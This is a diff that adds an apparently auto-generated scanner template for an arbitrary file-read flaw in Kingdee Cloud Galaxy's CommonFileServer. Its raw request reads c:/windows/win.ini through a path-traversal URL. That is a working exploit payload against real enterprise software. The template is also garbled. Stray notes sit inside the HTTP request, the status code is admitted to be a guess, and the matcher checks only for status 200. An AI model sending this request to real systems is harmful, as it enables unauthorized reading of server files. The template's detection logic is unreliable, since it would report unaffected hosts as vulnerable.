@@ -1,0 +1,36 @@
+id: poc-dbme912hcpuyr8w8
+info:
+  name: 金蝶云星空 CommonFileserver 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dbme912hcpuyr8w8
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dbme912hcpuyr8w8
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /CommonFileServer/c:/windows/win.ini HTTP/1.1
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
